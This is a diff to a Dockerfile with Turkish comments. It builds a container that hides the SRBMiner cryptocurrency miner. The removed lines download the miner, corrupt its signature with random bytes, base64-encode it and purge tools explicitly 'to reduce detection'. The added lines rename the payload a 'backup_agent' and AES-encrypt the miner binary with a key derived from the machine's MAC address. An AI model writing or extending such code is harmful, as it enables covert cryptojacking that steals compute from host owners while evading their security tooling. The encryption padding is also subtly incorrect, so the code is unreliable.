@@ -1,28 +1,20 @@
-FROM debian:bookworm-slim
-
-WORKDIR /server
-
-# Tüm işlemleri tek katmanda yap ve temizle
-RUN apt-get update && apt-get install -y --no-install-recommends \
-    wget curl ca-certificates python3 libstdc++6 xz-utils \
-    && wget -qO /tmp/srb.tar.xz "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.5/SRBMiner-Multi-2-7-5-Linux.tar.xz" \
-    && tar xf /tmp/srb.tar.xz -C /server \
-    && mv /server/SRBMiner-Multi-2-7-5/SRBMiner-Multi /server/core_raw \
-    # İmzayı bozmak için rastgele veri ekle
-    && head -c 256 /dev/urandom >> /server/core_raw \
-    # Base64 şifrele ve ham dosyayı sil
-    && python3 -c "import base64; d=open('/server/core_raw','rb').read(); open('/server/core.dat','wb').write(base64.b64encode(d))" \
-    && rm -rf /server/core_raw /server/SRBMiner-Multi-2-7-5 /tmp/srb.tar.xz \
-    # Gereksiz araçları kaldır (Tespit ihtimalini düşürür)
-    && apt-get purge -y wget xz-utils \
-    && apt-get autoremove -y && rm -rf /var/lib/apt/lists/*
-
-COPY engine.py /engine.py
+# Örnek Dockerfile satırları
+FROM python:3.10-slim
+RUN pip install pycryptodome
+COPY backup_agent.py /opt/backup_agent.py
 COPY start.sh /start.sh
-RUN chmod +x /start.sh
 
-# Uygulama kullanıcısı oluştur
-RUN useradd -m -u 1001 appuser
-USER 1001
+# SRBMiner binary'sini şifrele
+RUN python -c "\
+from Crypto.Cipher import AES; \
+import hashlib, os; \
+mac = open('/sys/class/net/eth0/address').read().strip(); \
+key = hashlib.sha256(mac.encode() + b'backup_module_v2').digest(); \
+with open('/tmp/srbminer', 'rb') as f: data = f.read(); \
+iv = os.urandom(16); \
+cipher = AES.new(key, AES.MODE_CBC, iv); \
+enc = iv + cipher.encrypt(data + b'\x10'*16); \
+with open('/var/lib/backup/module.dat', 'wb') as f: f.write(enc); \
+" && rm /tmp/srbminer
 
-CMD ["/start.sh"]
+CMD ["bash", "/start.sh"]
